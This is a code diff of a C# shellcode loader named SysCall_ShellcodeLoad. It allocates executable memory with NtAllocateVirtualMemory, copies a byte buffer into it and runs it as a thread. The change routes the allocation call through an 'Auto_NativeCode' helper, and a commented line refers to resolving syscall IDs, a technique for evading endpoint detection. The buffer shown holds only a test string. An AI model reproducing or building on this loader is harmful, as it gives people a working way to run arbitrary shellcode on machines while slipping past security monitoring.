@@ -44,6 +44,7 @@ namespace SysCall_ShellcodeLoad
                 0x79, 0x73, 0x63, 0x61, 0x6C, 0x6C, 0x00, 0x41, 0x50, 0x49, 0x20, 0x54, 
                 0x65, 0x73, 0x74, 0x00 
             };
+
             
             IntPtr pMemoryAllocation = IntPtr.Zero;
             IntPtr pZeroBits = IntPtr.Zero;
@@ -52,7 +53,7 @@ namespace SysCall_ShellcodeLoad
             uint MEM_RESERVE = 0x2000;
             uint PAGE_EXECUTE_READWRITE = 0x00000040;
 
-            uint ntAllocResult = NtAllocateVirtualMemory(
+            uint ntAllocResult = Auto_NativeCode.NtAllocateVirtualMemory(
                 GetCurrentProcess(), 
                 ref pMemoryAllocation, 
                 pZeroBits, 
@@ -61,6 +62,7 @@ namespace SysCall_ShellcodeLoad
                 PAGE_EXECUTE_READWRITE
             );
 
+            
             Console.WriteLine("AllocResult: " + ntAllocResult);
 
             Marshal.Copy(buf1, 0, (IntPtr)(pMemoryAllocation), buf1.Length);
@@ -86,7 +88,8 @@ namespace SysCall_ShellcodeLoad
 
             Console.WriteLine("hThreadResult: " + hThreadResult);
             uint result = NtWaitForSingleObject(hThread, true, 0);
-
+            
+            // Auto_NativeCode.GetSyscallID("NtAllocateVirtualMemory");
             return;
         }
     }
